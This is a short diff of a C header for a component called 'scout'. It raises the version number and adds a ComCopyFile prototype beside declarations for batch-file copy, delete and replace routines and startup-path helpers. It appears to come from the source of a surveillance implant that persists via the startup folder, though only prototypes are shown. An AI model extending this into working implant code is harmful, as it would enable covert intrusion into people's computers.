@@ -3,7 +3,7 @@
 
 #include "binpatched_vars.h"
 
-#define SCOUT_VERSION 6
+#define SCOUT_VERSION 7
 #define SHARED_MEMORY_WRITE_SIZE 4096
 
 VOID MySleep(ULONG uTime);
@@ -23,6 +23,7 @@ BOOL StartBatch(PWCHAR pName);
 VOID CreateCopyBatch(PWCHAR pSource, PWCHAR pDest, PWCHAR *pBatchOutName);
 VOID CreateDeleteBatch(PWCHAR pFileName, PWCHAR *pBatchOutName);
 VOID CreateReplaceBatch(PWCHAR pOldFile, PWCHAR pNewFile, PWCHAR *pBatchOutName);
+HRESULT ComCopyFile(__in LPWSTR strSourceFile, __in LPWSTR strDestDir, __in_opt LPWSTR strNewName);
 
 PWCHAR GetStartupPath();
 PWCHAR GetStartupScoutName();
